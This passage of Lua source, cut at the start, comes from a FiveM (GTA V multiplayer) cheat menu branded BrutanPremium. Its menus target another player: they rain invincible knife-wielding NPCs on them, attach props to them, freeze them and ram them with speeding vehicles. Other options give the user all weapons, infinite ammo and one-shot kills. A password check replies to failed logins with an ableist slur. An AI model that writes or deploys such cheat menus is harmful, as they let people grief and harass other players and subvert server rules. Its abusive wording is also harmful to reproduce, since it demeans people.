                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
					elseif BrutanPremium.Button("Rain Agressive NPC") then
                    local bQ = "mp_f_cocaine_01"
					local bR = "weapon_knife"
					for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                        RequestModel(GetHashKey(bQ))
                        Citizen.Wait(50)
                        if HasModelLoaded(GetHashKey(bQ)) then
                            local ped =
                                CreatePed(21, GetHashKey(bQ), bK.x + i, bK.y - i, bK.z + 15, 0, true, true)
							NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(50)
                                NetToPed(ei)
								GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
								SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
						end
                    end
                    elseif BrutanPremium.MenuButton("~r~→  ~s~Spawn Props On Player", "SpawnPropsMenu") then
                    elseif BrutanPremium.CheckBox(
                        "Freeze Player",
                        freezePlayer,
                        function(enabled)
                            freezePlayer = enabled
                        end)
                    then
                    end

                    BrutanPremium.Display()
                elseif BrutanPremium.IsMenuOpened("SpawnPropsMenu") then
                    if BrutanPremium.CheckBox(
                        "Attach Prop To Player",
                        attachProp,
                        function(enabled)
                            attachProp = enabled
                        end)
                    then
                    elseif BrutanPremium.ComboBox("Bone", { "Head", "Right Hand" }, currentBone, selectedBone, function(currentIndex, selectedIndex)
                        currentBone = currentIndex
                        selectedBone = selectedIndex
                    end)
                    then
                    elseif BrutanPremium.Button("Weed") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("prop_weed_01"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if selectedBone == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif selectedBone == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end
                    elseif BrutanPremium.Button("UFO") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("p_spinning_anus_s"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if selectedBone == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif selectedBone == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end
                    elseif BrutanPremium.Button("Windmill") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local obj = CreateObject(GetHashKey("prop_windmill_01"),coords.x,coords.y,coords.z,true,true,true)
                        if attachProp then
                            if selectedBone == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),39317),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            elseif selectedBone == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                            end
                        end
                    elseif BrutanPremium.Button("Custom Prop") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                        local input = KeyboardInput("Enter Prop Name", "", 100)
                        if IsModelValid(input) then
                            local obj = CreateObject(GetHashKey(input),coords.x,coords.y,coords.z,true,true,true)
                            if attachProp then
                                if selectedBone == 1 then
                                    AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                                elseif selectedBone == 2 then
                                    AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)
                                end
                            end
                        else
                            drawNotification("Invalid Model!")
                        end
                    end

                    BrutanPremium.Display()
            elseif BrutanPremium.IsMenuOpened("VehicleRamMenu") then
                if BrutanPremium.Button("Futo") then
                    local model = GetHashKey("futo")
                    RequestModel(model)
                    while not HasModelLoaded(model) do
                        Citizen.Wait(0)
                    end
                    local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
                    if HasModelLoaded(model) then
                        local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)
                        SetVehicleForwardSpeed(veh, 120.0)
                    end
                elseif BrutanPremium.Button("Bus") then
                    local model = GetHashKey("bus")
                    RequestModel(model)
                    while not HasModelLoaded(model) do
                        Citizen.Wait(0)
                    end
                    local offset = GetOffsetFromEntityInWorldCoords(GetPlayerPed(selectedPlayer), 0, -10.0, 0)
                    if HasModelLoaded(model) then
                        local veh = CreateVehicle(model, offset.x, offset.y, offset.z, GetEntityHeading(GetPlayerPed(selectedPlayer)), true, true)
                        SetVehicleForwardSpeed(veh, 120.0)
                    end
                end


                    BrutanPremium.Display()
            elseif BrutanPremium.IsMenuOpened("SingleWepPlayer") then
                for i = 1, #allWeapons do
                    if BrutanPremium.Button(allWeapons[i]) then
                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250, false, true)
                    end
                end


                BrutanPremium.Display()
            elseif BrutanPremium.IsMenuOpened("WeaponMenu") then
                if BrutanPremium.MenuButton("~r~→  ~s~Single Weapon Spawner", "SingleWeaponMenu") then
                elseif BrutanPremium.Button("Give All Weapons") then
                    for i = 1, #allWeapons do
                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 250, false, false)
                    end
                elseif BrutanPremium.Button("Remove All Weapons") then
                    for i = 1, #allWeapons do
                        RemoveAllPedWeapons(PlayerPedId(), true)
                    end
                elseif BrutanPremium.Button("Give Ammo") then
                    for i = 1, #allWeapons do
                        AddAmmoToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 250)
                    end
                elseif BrutanPremium.CheckBox(
                    "No Reload",
                    dwadawdwd,
                    function(enabled)
                        dwadawdwd = enabled
                        SetPedInfiniteAmmoClip(PlayerPedId(), dwadawdwd)
                    end)
                then
                elseif BrutanPremium.CheckBox(
                    "Infinite Ammo",
                    JYGNDJ,
                    function(enabled)
                        JYGNDJ = enabled
                        SetPedInfiniteAmmo(PlayerPedId(), JYGNDJ)
                    end)
                then
                elseif BrutanPremium.CheckBox(
                    "Explosive Ammo",
                    bifegfubffff,
                    function(enabled)
                        bifegfubffff = enabled
                    end)
                then
                elseif BrutanPremium.CheckBox(
                    "Oneshot",
                    Oneshot,
                    function(enabled)
                        Oneshot = enabled
                    end)
                then
				elseif BrutanPremium.CheckBox(
                    "No Recoil",
                    NOXJDSS,
                    function(enabled)
                        NOXJDSS = enabled
                    end)
                then
                elseif BrutanPremium.CheckBox(
                    "Delete Gun",
                    WADOHWIB,
                    function(enabled)
                        WADOHWIB = enabled
                    end)
                then
                elseif BrutanPremium.MenuButton("~r~→  ~s~Weapon Customization", "WeaponCustomization") then
                elseif BrutanPremium.MenuButton("~r~→  ~s~Bullet Gun Options", "BulletGunMenu") then
                end

                BrutanPremium.Display()
            elseif BrutanPremium.IsMenuOpened("WeaponCustomization") then
                if BrutanPremium.CheckBox(
                    "Rainbow Tint",
                    rainbowTint,
                    function(enabled)
                        rainbowTint = enabled
                    end)
                then
                elseif BrutanPremium.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currentTint, selectedTint, function(currentIndex, selectedIndex)
                    currentTint = currentIndex
                    selectedTint = selectedIndex

                    if selectedTint == 1 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0)
                    end
                    if selectedTint == 2 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1)
                    end
                    if selectedTint == 3 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2)
                    end
                    if selectedTint == 4 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3)
                    end
                    if selectedTint == 5 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 4)
                    end
                    if selectedTint == 6 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 5)
                    end
                    if selectedTint == 7 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 6)
                    end
                    if selectedTint == 8 then
                        SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 7)
                    end
                end)
                then
                elseif BrutanPremium.Button("~g~Add Special Finish") then
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
                elseif BrutanPremium.Button("~r~Remove Special Finish") then
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x27872C90)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD7391086)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9B76C72C)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x487AAE09)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x85A64DF9)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x377CD377)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD89B9658)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4EAD7533)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x4032B5E7)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x77B8AB2F)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x7A6A7B7B)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x161E9241)
                elseif BrutanPremium.Button("~g~Add Suppressor") then
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
                elseif BrutanPremium.Button("~r~Remove Suppressor") then
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x65EA7EBB)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x837445AA)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA73D4664)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xC304849A)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xE608B35E)
                elseif BrutanPremium.Button("~g~Add Scope") then
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
                    GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
                elseif BrutanPremium.Button("~r~Remove Scope") then
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x9D2FBF29)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xA0D89C42)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xAA2C45B4)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0xD2443DDC)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3CC6BA57)
                    RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0x3C00AFED)
                end

                BrutanPremium.Display()
            elseif BrutanPremium.IsMenuOpened("BulletGunMenu") then
                if BrutanPremium.CheckBox(
                    "Vehicle Gun",
                    vehicleGun,
                    function(enabled)
                        vehicleGun = enabled
                    end)
                then
                elseif BrutanPremium.ComboBox("Vehicle To Shoot", vehicles, currentVehicle, selectedVehicle, function(currentIndex, selectedIndex)
                    currentVehicle = currentIndex
                    selectedVehicle = selectedIndex

                end)
                then
                elseif BrutanPremium.ComboBox("Vehicle Speed", vehicleSpeed, currentVehicleSpeed, selectedVehicleSpeed, function(currentIndex, selectedIndex)
                    currentVehicleSpeed = currentIndex
                    selectedVehicleSpeed = selectedIndex
                end)
                then
                elseif BrutanPremium.CheckBox(
                    "Ped Gun",
                    pedGun,
                    function(enabled)
                        pedGun = enabled
                end)
                then
                elseif BrutanPremium.ComboBox("Ped To Shoot", peds, currentPed, selectedPed, function(currentIndex, selectedIndex)
                    currentPed = currentIndex
                    selectedPed = selectedIndex
                end)
                then
                elseif BrutanPremium.CheckBox(
                    "Bullet Gun",
                    bulletGun,
                    function(enabled)
                        bulletGun = enabled
                    end)
                then
                elseif BrutanPremium.ComboBox("Bullet", bullets, currentBullet, selectedBullet, function(currentIndex, selectedIndex)
                    currentBullet = currentIndex
                    selectedBullet = selectedIndex
                    end)
                then
                end




                BrutanPremium.Display()
            elseif BrutanPremium.IsMenuOpened("SingleWeaponMenu") then
                for i = 1, #allWeapons do
                    if BrutanPremium.Button(allWeapons[i]) then
                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 250, false, false)
                    end
                end



                BrutanPremium.Display()
            elseif IsDisabledControlPressed(0, 162) then
                if planeisbest then
                    trynaskidhuh("MainMenu")
                else
                    local temp = KeyboardInput("Enter Password", "brutanpremium", 100)
                    if temp == dEI then
                        drawNotification("~r~~h~Well done, you just logged in!")
                        planeisbest = true
                        trynaskidhuh("MainMenu")
                    else
                        drawNotification("~r~~h~Login has failed, are you fucking retarded?")
                    end
                end
            end

            Citizen.Wait(0)
        end
    end)